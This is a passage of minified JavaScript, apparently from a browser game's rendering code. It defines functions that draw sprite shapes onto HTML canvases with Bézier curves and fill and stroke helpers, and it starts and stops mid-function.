                    r.bezierCurveTo(272 * e, 295.5999984741211 * e, 277 * e, 288.5999984741211 * e, 278 * e, 271.5999984741211 * e),
                    r.bezierCurveTo(277.5 * e, 236.5999984741211 * e, 277.5 * e, 236.5999984741211 * e, 277 * e, 201.5999984741211 * e),
                    r.bezierCurveTo(276 * e, 186.5999984741211 * e, 265 * e, 178.5999984741211 * e, 254 * e, 177.5999984741211 * e),
                    r.bezierCurveTo(247.5 * e, 177.5999984741211 * e, 247.5 * e, 177.5999984741211 * e, 241 * e, 177.5999984741211 * e),
                    r.bezierCurveTo(255 * e, 202.5999984741211 * e, 214 * e, 217.5999984741211 * e, 201 * e, 215.5999984741211 * e),
                    r.bezierCurveTo(170 * e, 215.5999984741211 * e, 152 * e, 197.5999984741211 * e, 161 * e, 178.5999984741211 * e),
                    r.closePath(),
                    he(r, i[2], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(162 * e, 175.5999984741211 * e),
                    r.bezierCurveTo(153 * e, 176.0999984741211 * e, 153 * e, 176.0999984741211 * e, 144 * e, 176.5999984741211 * e),
                    r.bezierCurveTo(125 * e, 178.5999984741211 * e, 121 * e, 196.5999984741211 * e, 121 * e, 207.5999984741211 * e),
                    r.bezierCurveTo(121 * e, 243.20000076293945 * e, 121 * e, 243.20000076293945 * e, 121 * e, 278.8000030517578 * e),
                    r.bezierCurveTo(126 * e, 298.8000030517578 * e, 137 * e, 300.8000030517578 * e, 146 * e, 302.8000030517578 * e),
                    r.bezierCurveTo(200.5 * e, 302.8000030517578 * e, 200.5 * e, 302.8000030517578 * e, 255 * e, 302.8000030517578 * e),
                    r.bezierCurveTo(271 * e, 301.8000030517578 * e, 279 * e, 288.8000030517578 * e, 279 * e, 273.8000030517578 * e),
                    r.bezierCurveTo(279 * e, 236.8000030517578 * e, 279 * e, 236.8000030517578 * e, 279 * e, 199.8000030517578 * e),
                    r.bezierCurveTo(274 * e, 178.8000030517578 * e, 263 * e, 177.8000030517578 * e, 255 * e, 175.8000030517578 * e),
                    r.bezierCurveTo(248 * e, 175.8000030517578 * e, 248 * e, 175.8000030517578 * e, 241 * e, 175.8000030517578 * e),
                    r.bezierCurveTo(240 * e, 175.8000030517578 * e, 240 * e, 175.8000030517578 * e, 239 * e, 175.8000030517578 * e),
                    r.bezierCurveTo(254 * e, 200.8000030517578 * e, 222 * e, 211.8000030517578 * e, 202 * e, 212.8000030517578 * e),
                    r.bezierCurveTo(168 * e, 213.8000030517578 * e, 151 * e, 190.8000030517578 * e, 163 * e, 176.8000030517578 * e),
                    r.closePath(),
                    he(r, void 0, i[3], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(198 * e, 161.4000015258789 * e),
                    r.bezierCurveTo(198 * e, 186.9000015258789 * e, 198 * e, 186.9000015258789 * e, 198 * e, 212.4000015258789 * e),
                    r.bezierCurveTo(201 * e, 212.4000015258789 * e, 201 * e, 212.4000015258789 * e, 204 * e, 212.4000015258789 * e),
                    r.bezierCurveTo(204 * e, 186.9000015258789 * e, 204 * e, 186.9000015258789 * e, 204 * e, 161.4000015258789 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(161 * e, 194 * e),
                    r.bezierCurveTo(188 * e, 169 * e, 231 * e, 179 * e, 241 * e, 194 * e),
                    r.bezierCurveTo(239.5 * e, 196 * e, 239.5 * e, 196 * e, 238 * e, 198 * e),
                    r.bezierCurveTo(221 * e, 179 * e, 182 * e, 182 * e, 165 * e, 198 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(162 * e, 150.80000019073486 * e, 241 * e, 150.80000019073486 * e, 245 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(242 * e, 224.80000019073486 * e, 162 * e, 228.80000019073486 * e, 157 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(159 * e, 188.80000019073486 * e, 159 * e, 188.80000019073486 * e, 161 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(168 * e, 216.80000019073486 * e, 231 * e, 218.80000019073486 * e, 241 * e, 188.80000019073486 * e),
                    r.bezierCurveTo(236 * e, 156.80000019073486 * e, 169 * e, 152.80000019073486 * e, 161 * e, 188.80000019073486 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(156 * e, 188 * e),
                    r.bezierCurveTo(160 * e, 164 * e, 183 * e, 159 * e, 201 * e, 158 * e),
                    r.bezierCurveTo(232 * e, 159 * e, 244 * e, 174 * e, 246 * e, 188 * e),
                    r.bezierCurveTo(245 * e, 212 * e, 213 * e, 219 * e, 201 * e, 218 * e),
                    r.bezierCurveTo(181 * e, 221 * e, 158 * e, 207 * e, 156 * e, 190 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(162 * e, 189 * e),
                    r.bezierCurveTo(166 * e, 170 * e, 185 * e, 165 * e, 201 * e, 164 * e),
                    r.bezierCurveTo(227 * e, 165 * e, 240 * e, 178 * e, 239 * e, 188 * e),
                    r.bezierCurveTo(239 * e, 204 * e, 210 * e, 210 * e, 201 * e, 210 * e),
                    r.bezierCurveTo(182 * e, 211 * e, 166 * e, 200 * e, 162 * e, 190 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(131 * e, 262 * e),
                    r.bezierCurveTo(136 * e, 241 * e, 144 * e, 236 * e, 158 * e, 233 * e),
                    r.bezierCurveTo(200.5 * e, 233 * e, 229 * e, 232 * e, 243 * e, 233 * e),
                    r.bezierCurveTo(259 * e, 235 * e, 267 * e, 248 * e, 269 * e, 260 * e),
                    r.bezierCurveTo(269 * e, 266.5 * e, 269 * e, 266.5 * e, 269 * e, 273 * e),
                    r.bezierCurveTo(265 * e, 290 * e, 251 * e, 297 * e, 242 * e, 298 * e),
                    r.bezierCurveTo(202 * e, 298 * e, 202 * e, 298 * e, 162 * e, 298 * e),
                    r.bezierCurveTo(148 * e, 298 * e, 136 * e, 289 * e, 132 * e, 273 * e),
                    r.bezierCurveTo(131.5 * e, 268 * e, 131.5 * e, 268 * e, 131 * e, 263 * e),
                    r.bezierCurveTo(135 * e, 263 * e, 135 * e, 263 * e, 139 * e, 263 * e),
                    r.bezierCurveTo(139 * e, 281 * e, 151 * e, 287 * e, 160 * e, 290 * e),
                    r.bezierCurveTo(200.5 * e, 290 * e, 200.5 * e, 290 * e, 241 * e, 290 * e),
                    r.bezierCurveTo(252 * e, 290 * e, 257 * e, 281 * e, 262 * e, 271 * e),
                    r.bezierCurveTo(261.5 * e, 267 * e, 261.5 * e, 267 * e, 261 * e, 263 * e),
                    r.bezierCurveTo(260 * e, 249 * e, 251 * e, 242 * e, 241 * e, 241 * e),
                    r.bezierCurveTo(240.5 * e, 240.5 * e, 240.5 * e, 240.5 * e, 240 * e, 240 * e),
                    r.bezierCurveTo(200 * e, 240 * e, 200 * e, 240 * e, 160 * e, 240 * e),
                    r.bezierCurveTo(145 * e, 244 * e, 142 * e, 250 * e, 139 * e, 264 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 2 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(130 * e, 264 * e),
                    r.bezierCurveTo(132 * e, 244 * e, 144 * e, 235 * e, 157 * e, 232 * e),
                    r.bezierCurveTo(245 * e, 232 * e, 201 * e, 232 * e, 245 * e, 232 * e),
                    r.bezierCurveTo(264 * e, 235 * e, 269 * e, 251 * e, 270 * e, 264 * e),
                    r.bezierCurveTo(272 * e, 291 * e, 248 * e, 299 * e, 242 * e, 299 * e),
                    r.bezierCurveTo(200 * e, 299 * e, 200 * e, 299 * e, 158 * e, 299 * e),
                    r.bezierCurveTo(139 * e, 298 * e, 130 * e, 276 * e, 130 * e, 265 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 2 * e),
                    n
            }
            function Nt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(96.5 * e, 277.34375 * e),
                    r.bezierCurveTo(197.5 * e, 259.84375 * e, 197.5 * e, 259.84375 * e, 298.5 * e, 242.34375 * e),
                    r.bezierCurveTo(311.5 * e, 231.34375 * e, 307.5 * e, 168.34375 * e, 298.5 * e, 150.34375 * e),
                    r.bezierCurveTo(198 * e, 170.34375 * e, 198 * e, 170.34375 * e, 97.5 * e, 190.34375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98.5 * e, 214.34375 * e),
                    r.bezierCurveTo(199 * e, 196.34375 * e, 199 * e, 196.34375 * e, 299.5 * e, 178.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(98.5 * e, 247.34375 * e),
                    r.bezierCurveTo(201.5 * e, 229.34375 * e, 201.5 * e, 229.34375 * e, 304.5 * e, 211.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(97.5 * e, 189.34375 * e),
                    r.bezierCurveTo(97 * e, 199.84375 * e, 97 * e, 199.84375 * e, 96.5 * e, 210.34375 * e),
                    r.bezierCurveTo(110.5 * e, 204.34375 * e, 110.5 * e, 204.34375 * e, 124.5 * e, 198.34375 * e),
                    r.bezierCurveTo(137.5 * e, 203.84375 * e, 137.5 * e, 203.84375 * e, 150.5 * e, 209.34375 * e),
                    r.bezierCurveTo(172 * e, 197.84375 * e, 172 * e, 197.84375 * e, 193.5 * e, 186.34375 * e),
                    r.bezierCurveTo(211.5 * e, 189.84375 * e, 211.5 * e, 189.84375 * e, 229.5 * e, 193.34375 * e),
                    r.bezierCurveTo(240.5 * e, 193.34375 * e, 240.5 * e, 193.34375 * e, 251.5 * e, 193.34375 * e),
                    r.bezierCurveTo(261 * e, 182.84375 * e, 261 * e, 182.84375 * e, 270.5 * e, 172.34375 * e),
                    r.bezierCurveTo(287.5 * e, 169.34375 * e, 287.5 * e, 169.34375 * e, 304.5 * e, 166.34375 * e),
                    r.bezierCurveTo(304.5 * e, 156.34375 * e, 300.5 * e, 145.34375 * e, 298.5 * e, 147.34375 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(300.5 * e, 147.34375 * e),
                    r.bezierCurveTo(293.5 * e, 121.34375 * e, 278.5 * e, 106.34375 * e, 256.5 * e, 101.34375 * e),
                    r.bezierCurveTo(176.5 * e, 145.34375 * e, 176.5 * e, 145.34375 * e, 96.5 * e, 189.34375 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 12 * e),
                    ke(r, 252.5 * e, 129.34375 * e, 18.027756377319946 * e),
                    he(r, i[7]),
                    ke(r, 248.5 * e, 121.34375 * e, 8.246211251235321 * e),
                    he(r, i[8]),
                    n
            }
            function St(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 400 * e,
                    n.height = 400 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(10 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(100.5 * e, 126.34375 * e),
                    r.bezierCurveTo(151.5 * e, 104.34375 * e, 279.5 * e, 188.34375 * e, 297.5 * e, 292.34375 * e),
                    r.bezierCurveTo(222.5 * e, 307.34375 * e, 106.5 * e, 196.34375 * e, 100.5 * e, 127.34375 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(106.5 * e, 131.34375 * e),
                    r.bezierCurveTo(140.5 * e, 142.34375 * e, 225.5 * e, 184.34375 * e, 290.5 * e, 287.34375 * e),
                    r.bezierCurveTo(270.5 * e, 188.34375 * e, 152.5 * e, 118.34375 * e, 107.5 * e, 131.34375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157.5 * e, 137.34375 * e),
                    r.bezierCurveTo(161.5 * e, 138.34375 * e, 164.5 * e, 140.34375 * e, 168.5 * e, 142.34375 * e),
                    r.bezierCurveTo(165.5 * e, 156.34375 * e, 141.5 * e, 176.34375 * e, 126.5 * e, 179.34375 * e),
                    r.bezierCurveTo(123.5 * e, 173.34375 * e, 120.5 * e, 169.34375 * e, 120.5 * e, 169.34375 * e),
                    r.bezierCurveTo(141.5 * e, 161.34375 * e, 156.5 * e, 145.34375 * e, 155.5 * e, 136.34375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(196.5 * e, 151.34375 * e),
                    r.bezierCurveTo(211.5 * e, 158.34375 * e, 224.5 * e, 171.34375 * e, 229.5 * e, 176.34375 * e),
                    r.bezierCurveTo(246.5 * e, 163.34375 * e, 259.5 * e, 166.34375 * e, 272.5 * e, 168.34375 * e),
                    r.bezierCurveTo(254.5 * e, 146.34375 * e, 214.5 * e, 145.34375 * e, 198.5 * e, 151.34375 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(154.5 * e, 222.34375 * e),
                    r.bezierCurveTo(164.5 * e, 234.34375 * e, 173.5 * e, 242.34375 * e, 178.5 * e, 245.34375 * e),
                    r.bezierCurveTo(174.5 * e, 265.34375 * e, 180.5 * e, 274.34375 * e, 186.5 * e, 283.34375 * e),
                    r.bezierCurveTo(165.5 * e, 277.34375 * e, 151.5 * e, 245.34375 * e, 155.5 * e, 224.34375 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(279.5 * e, 294.34375 * e),
                    r.bezierCurveTo(286.5 * e, 285.84375 * e, 286.5 * e, 285.84375 * e, 293.5 * e, 277.34375 * e),
                    r.bezierCurveTo(315.5 * e, 280.34375 * e, 315.5 * e, 280.34375 * e, 337.5 * e, 283.34375 * e),
                    r.bezierCurveTo(340.5 * e, 311.34375 * e, 317.5 * e, 326.34375 * e, 307.5 * e, 331.34375 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 12 * e),
                    r.globalAlpha = 1,
                    r.translate(-10 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(100.5 * e, 126.34375 * e),
                    r.bezierCurveTo(151.5 * e, 104.34375 * e, 279.5 * e, 188.34375 * e, 297.5 * e, 292.34375 * e),
                    r.bezierCurveTo(222.5 * e, 307.34375 * e, 106.5 * e, 196.34375 * e, 100.5 * e, 127.34375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(106.5 * e, 131.34375 * e),
                    r.bezierCurveTo(140.5 * e, 142.34375 * e, 225.5 * e, 184.34375 * e, 290.5 * e, 287.34375 * e),
                    r.bezierCurveTo(270.5 * e, 188.34375 * e, 152.5 * e, 118.34375 * e, 107.5 * e, 131.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(157.5 * e, 137.34375 * e),
                    r.bezierCurveTo(161.5 * e, 138.34375 * e, 164.5 * e, 140.34375 * e, 168.5 * e, 142.34375 * e),
                    r.bezierCurveTo(165.5 * e, 156.34375 * e, 141.5 * e, 176.34375 * e, 126.5 * e, 179.34375 * e),
                    r.bezierCurveTo(123.5 * e, 173.34375 * e, 120.5 * e, 169.34375 * e, 120.5 * e, 169.34375 * e),
                    r.bezierCurveTo(141.5 * e, 161.34375 * e, 156.5 * e, 145.34375 * e, 155.5 * e, 136.34375 * e),
                    r.closePath(),
                    he(r, i[4]),
                    ke(r, 125.5 * e, 140.34375 * e, 11.180339887498949 * e),
                    he(r, i[5]),
                    ke(r, 122.5 * e, 135.34375 * e, 5.0990195135927845 * e),
                    he(r, i[6]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(196.5 * e, 151.34375 * e),
                    r.bezierCurveTo(211.5 * e, 158.34375 * e, 224.5 * e, 171.34375 * e, 229.5 * e, 176.34375 * e),
                    r.bezierCurveTo(246.5 * e, 163.34375 * e, 259.5 * e, 166.34375 * e, 272.5 * e, 168.34375 * e),
                    r.bezierCurveTo(254.5 * e, 146.34375 * e, 214.5 * e, 145.34375 * e, 198.5 * e, 151.34375 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(154.5 * e, 222.34375 * e),
                    r.bezierCurveTo(164.5 * e, 234.34375 * e, 173.5 * e, 242.34375 * e, 178.5 * e, 245.34375 * e),
                    r.bezierCurveTo(174.5 * e, 265.34375 * e, 180.5 * e, 274.34375 * e, 186.5 * e, 283.34375 * e),
                    r.bezierCurveTo(165.5 * e, 277.34375 * e, 151.5 * e, 245.34375 * e, 155.5 * e, 224.34375 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(279.5 * e, 294.34375 * e),
                    r.bezierCurveTo(286.5 * e, 285.84375 * e, 286.5 * e, 285.84375 * e, 293.5 * e, 277.34375 * e),
                    r.bezierCurveTo(315.5 * e, 280.34375 * e, 315.5 * e, 280.34375 * e, 337.5 * e, 283.34375 * e),
                    r.bezierCurveTo(340.5 * e, 311.34375 * e, 317.5 * e, 326.34375 * e, 307.5 * e, 331.34375 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 12 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(296.5 * e, 287.34375 * e),
                    r.bezierCurveTo(311.5 * e, 291.34375 * e, 311.5 * e, 291.34375 * e, 326.5 * e, 295.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[9], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(294.5 * e, 289.34375 * e),
                    r.bezierCurveTo(308.5 * e, 297.34375 * e, 308.5 * e, 297.34375 * e, 322.5 * e, 305.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[9], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(294.5 * e, 291.34375 * e),
                    r.bezierCurveTo(304 * e, 303.34375 * e, 304 * e, 303.34375 * e, 313.5 * e, 315.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[9], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(226.5 * e, 161.34375 * e),
                    r.bezierCurveTo(230.5 * e, 160.34375 * e, 236.5 * e, 158.34375 * e, 238.5 * e, 161.34375 * e),
                    r.bezierCurveTo(238.5 * e, 157.34375 * e, 228.5 * e, 159.34375 * e, 227.5 * e, 161.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[9], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(167.5 * e, 248.34375 * e),
                    r.bezierCurveTo(165.5 * e, 251.34375 * e, 168.5 * e, 256.34375 * e, 168.5 * e, 253.34375 * e),
                    r.bezierCurveTo(166.5 * e, 252.34375 * e, 168.5 * e, 246.34375 * e, 166.5 * e, 247.34375 * e),
                    r.closePath(),
                    he(r, void 0, i[9], 3 * e),
                    n
            }
            function mt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 309 * e,
                    n.height = 287 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(10 * e, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(34.5 * e, 38.53125 * e),
                    r.bezierCurveTo(91.5 * e, 30.53125 * e, 138.5 * e, 68.53125 * e, 169.5 * e, 93.53125 * e),
                    r.bezierCurveTo(208.5 * e, 128.53125 * e, 226.5 * e, 157.53125 * e, 233.5 * e, 209.53125 * e),
                    r.bezierCurveTo(195.5 * e, 218.53125 * e, 138.5 * e, 191.53125 * e, 105.5 * e, 157.53125 * e),
                    r.bezierCurveTo(54.5 * e, 112.53125 * e, 41.5 * e, 80.53125 * e, 33.5 * e, 38.53125 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(143.5 * e, 74.53125 * e),
                    r.bezierCurveTo(164.5 * e, 73.53125 * e, 159 * e, 74.53125 * e, 174.5 * e, 74.53125 * e),
                    r.bezierCurveTo(186 * e, 86.53125 * e, 186 * e, 86.53125 * e, 197.5 * e, 98.53125 * e),
                    r.bezierCurveTo(186 * e, 97.03125 * e, 186 * e, 97.03125 * e, 174.5 * e, 95.53125 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.5 * e, 142.53125 * e),
                    r.bezierCurveTo(92 * e, 160.03125 * e, 92 * e, 160.03125 * e, 96.5 * e, 177.53125 * e),
                    r.bezierCurveTo(108 * e, 181.53125 * e, 108 * e, 181.53125 * e, 119.5 * e, 185.53125 * e),
                    r.bezierCurveTo(116.5 * e, 175.53125 * e, 116.5 * e, 175.53125 * e, 113.5 * e, 165.53125 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(236.5 * e, 189.53125 * e),
                    r.bezierCurveTo(274.5 * e, 197.53125 * e, 255.5 * e, 194.03125 * e, 274.5 * e, 198.53125 * e),
                    r.bezierCurveTo(272.5 * e, 236.53125 * e, 261.5 * e, 237.53125 * e, 242.5 * e, 248.53125 * e),
                    r.bezierCurveTo(230.5 * e, 231.03125 * e, 230.5 * e, 231.03125 * e, 218.5 * e, 213.53125 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 10 * e),
                    r.globalAlpha = 1,
                    r.translate(-10 * e, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(34.5 * e, 38.53125 * e),
                    r.bezierCurveTo(91.5 * e, 30.53125 * e, 138.5 * e, 68.53125 * e, 169.5 * e, 93.53125 * e),
                    r.bezierCurveTo(208.5 * e, 128.53125 * e, 226.5 * e, 157.53125 * e, 233.5 * e, 209.53125 * e),
                    r.bezierCurveTo(195.5 * e, 218.53125 * e, 138.5 * e, 191.53125 * e, 105.5 * e, 157.53125 * e),
                    r.bezierCurveTo(54.5 * e, 112.53125 * e, 41.5 * e, 80.53125 * e, 33.5 * e, 38.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(143.5 * e, 74.53125 * e),
                    r.bezierCurveTo(164.5 * e, 73.53125 * e, 159 * e, 74.53125 * e, 174.5 * e, 74.53125 * e),
                    r.bezierCurveTo(186 * e, 86.53125 * e, 186 * e, 86.53125 * e, 197.5 * e, 98.53125 * e),
                    r.bezierCurveTo(186 * e, 97.03125 * e, 186 * e, 97.03125 * e, 174.5 * e, 95.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.5 * e, 142.53125 * e),
                    r.bezierCurveTo(92 * e, 160.03125 * e, 92 * e, 160.03125 * e, 96.5 * e, 177.53125 * e),
                    r.bezierCurveTo(108 * e, 181.53125 * e, 108 * e, 181.53125 * e, 119.5 * e, 185.53125 * e),
                    r.bezierCurveTo(116.5 * e, 175.53125 * e, 116.5 * e, 175.53125 * e, 113.5 * e, 165.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(236.5 * e, 189.53125 * e),
                    r.bezierCurveTo(274.5 * e, 197.53125 * e, 255.5 * e, 194.03125 * e, 274.5 * e, 198.53125 * e),
                    r.bezierCurveTo(272.5 * e, 236.53125 * e, 261.5 * e, 237.53125 * e, 242.5 * e, 248.53125 * e),
                    r.bezierCurveTo(230.5 * e, 231.03125 * e, 230.5 * e, 231.03125 * e, 218.5 * e, 213.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(109.5 * e, 51.53125 * e),
                    r.bezierCurveTo(107.5 * e, 92.53125 * e, 91.5 * e, 95.53125 * e, 59.5 * e, 101.53125 * e),
                    he(r, i[1], i[2], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72.5 * e, 51.53125 * e),
                    r.bezierCurveTo(71 * e, 64.53125 * e, 69.5 * e, 76.53125 * e, 69.5 * e, 77.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84.5 * e, 63.53125 * e),
                    r.bezierCurveTo(70.5 * e, 65.03125 * e, 70.5 * e, 65.03125 * e, 56.5 * e, 66.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(125.5 * e, 84.53125 * e),
                    r.bezierCurveTo(125.5 * e, 110.03125 * e, 125.5 * e, 110.03125 * e, 125.5 * e, 135.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(149.5 * e, 108.53125 * e),
                    r.bezierCurveTo(150 * e, 137.03125 * e, 150 * e, 137.03125 * e, 150.5 * e, 165.53125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 7 * e),
                    n
            }
            function Dt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 130 * e
                    , a = 142 * e
                    , s = o / 2
                    , _ = a / 2;
                return n.width = o,
                    n.height = a,
                    r.translate(s, _ + 7 * e),
                    r.globalAlpha = t ? .5 : 1,
                    ke(r, 0, 0, 60 * e),
                    he(r, i[0]),
                    r.translate(0, -7 * e),
                    r.globalAlpha = 1,
                    ke(r, 0, 0, 60 * e),
                    he(r, i[1], i[2], 4 * e),
                    ke(r, 0, 0, 40 * e),
                    he(r, i[3]),
                    ke(r, 0, 0, 25 * e),
                    he(r, i[4], i[5], 8 * e),
                    n
            }
            function vt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 130 * e,
                    n.height = 142 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(65 * e, 80 * e),
                    r.rotate(.2),
                    A(r, 9, 60 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(65 * e, 71 * e),
                    r.rotate(.2),
                    A(r, 9, 60 * e, 10 * e),
                    he(r, i[1], i[2], 4),
                    r.rotate(-.32),
                    A(r, 9, 38 * e, 10 * e),
                    he(r, i[3], i[4], 4),
                    r.rotate(.68),
                    A(r, 9, 20 * e, 8 * e),
                    he(r, i[5], i[6], 6),
                    r.restore(),
                    n
            }
            function Mt(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 372 * e,
                    i.height = 375 * e,
                    n.globalAlpha = .5,
                    n.translate(15 * e, 15 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(313.0000305175781 * e, 76.58523559570312 * e),
                    n.bezierCurveTo(308.0000305175781 * e, 130.58523559570312 * e, 279.0000305175781 * e, 158.58523559570312 * e, 254.00003051757812 * e, 175.58523559570312 * e),
                    n.bezierCurveTo(287.0000305175781 * e, 182.58523559570312 * e, 274.0000305175781 * e, 181.08523559570312 * e, 294.0000305175781 * e, 186.58523559570312 * e),
                    n.bezierCurveTo(293.5000305175781 * e, 196.08523559570312 * e, 293.5000305175781 * e, 196.08523559570312 * e, 293.0000305175781 * e, 205.58523559570312 * e),
                    n.bezierCurveTo(304.0000305175781 * e, 201.08523559570312 * e, 304.0000305175781 * e, 201.08523559570312 * e, 315.0000305175781 * e, 196.58523559570312 * e),
                    n.bezierCurveTo(350.0000305175781 * e, 219.58523559570312 * e, 343.0000305175781 * e, 221.58523559570312 * e, 351.0000305175781 * e, 230.58523559570312 * e),
